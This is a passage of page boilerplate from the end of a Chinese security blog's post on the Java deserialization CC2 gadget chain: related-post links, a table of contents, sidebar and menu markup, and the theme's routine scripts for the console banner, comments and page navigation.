href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC6</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/" title="java反序列化--CC7"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC7</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3/" title="java反序列化--CC3"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC3</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%93CC2"><span class="toc-number">1.</span> <span class="toc-text">java反序列化–CC2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">环境配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-4-0%E4%B8%8B%E7%9A%84%E6%80%9D%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">Commons-Collections&#x3D;4.0下的思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2"><span class="toc-number">1.3.</span> <span class="toc-text">CC2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.3.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">链子构造与分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2%E7%9A%84%E8%BF%9B%E5%8C%96%E4%B9%8B%E8%B7%AF"><span class="toc-number">1.4.</span> <span class="toc-text">CC2的进化之路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%8C%96%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">进化失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%8C%96%E6%88%90%E5%8A%9F"><span class="toc-number">1.4.2.</span> <span class="toc-text">进化成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">链子分析</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" title="JAVA加载字节码">JAVA加载字节码</a><time datetime="2024-06-07T13:32:59.000Z" title="发表于 2024-06-07 21:32:59">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/" title="java反序列化--CC7">java反序列化--CC7</a><time datetime="2024-06-07T13:21:19.000Z" title="发表于 2024-06-07 21:21:19">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6">java反序列化--CC6</a><time datetime="2024-06-07T13:21:15.000Z" title="发表于 2024-06-07 21:21:15">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/" title="java反序列化--CC5">java反序列化--CC5</a><time datetime="2024-06-07T13:21:09.000Z" title="发表于 2024-06-07 21:21:09">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4">java反序列化--CC4</a><time datetime="2024-06-07T13:21:03.000Z" title="发表于 2024-06-07 21:21:03">2024-06-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const initWaline = () => {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'waline.cszvvds.cc',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (typeof Waline === 'object') initWaline()
+    else {
+      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
+      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
+      initWaline()
+    }
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = content => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = async () => {
+    try {
+      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
+      const result = await res.json()
+      const walineArray = result.data.map(e => {
+        return {
+          'content': changeContent(e.comment),
+          'avatar': e.avatar,
+          'nick': e.nick,
+          'url': e.url + '#' + e.objectId,
+          'date': e.time || e.insertedAt
+        }
+      })
+      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
+      generateHtml(walineArray)
+    } catch (err) {
+      console.error(err)
+      const $dom = document.querySelector('#card-newest-comments .aside-list')
+      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+    }
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('waline-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
